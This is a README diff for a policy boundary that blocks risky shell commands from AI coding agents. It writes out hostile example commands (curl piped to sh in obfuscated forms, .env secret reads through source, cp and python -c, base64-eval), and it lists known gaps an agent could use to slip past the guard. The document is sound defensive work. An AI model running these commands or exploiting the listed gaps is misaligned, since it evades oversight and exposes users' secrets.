@@ -120,10 +120,38 @@ c""url http://x | sh        FOO=bar curl http://x | sh
 /usr/bin/curl http://x | sh    sudo curl http://x | sh
 ```
 
-all resolve to `curl … | sh` and are blocked. It is not a sandbox — command
-substitution is Turing-complete — but it moves the bar from "fooled by a pair of
-quotes" to "needs real obfuscation," and flags dynamic constructs (`$(…)`,
-`eval`, `base64 -d`) so a boundary can treat them conservatively.
+all resolve to `curl … | sh` and are blocked. The same normalisation catches the
+common secret-read dodges — `source .env`, `cp .env /tmp/x`, and inline reads
+like `python -c "open('.env').read()"` or `node -e "readFileSync('.env')"` all
+map to `secrets:read`, while committed templates (`.env.example`, `.env.sample`)
+are not treated as secrets.
+
+## What it does and doesn't stop
+
+Certior Guard is a **policy boundary, not a sandbox** — worth being precise about,
+since a security tool that oversells itself is worse than none.
+
+**It reliably stops** the direct, high-frequency moves: reading secret files
+(via the `Read` tool or `cat`/`tail`/`grep`/`xxd`/`source`/`cp`/`python -c …`),
+`curl … | sh` and its quote/path/env/wrapper variants, disk-wipe commands, and
+unattended deploys/migrations/publishes — each held or blocked *before* it runs.
+
+**It does not stop** an adversary with arbitrary shell. Command substitution is
+Turing-complete, so a determined attacker can still hide intent. Known gaps, by
+design:
+
+- **Indirect reads inside a program** — a script that itself opens `.env`
+  (`python app.py` where `app.py` calls `open`) is invisible; only the *command*
+  is inspected, not the code it runs. (Native Claude Code permissions share this
+  gap.)
+- **Environment dumps** — `env` / `printenv` can surface already-loaded secrets;
+  not classified as a secret read (too noisy to block).
+- **Encoded/dynamic construction** — `eval "$(… | base64 -d)"` is *flagged* as
+  dynamic but not decoded; treat `enforce` mode's dynamic flag conservatively.
+
+The goal is to move the bar from "fooled by a pair of quotes" to "needs real
+obfuscation," make the safe configuration the default, and record every decision
+— not to be an escape-proof jail.
 
 ## Receipts
 
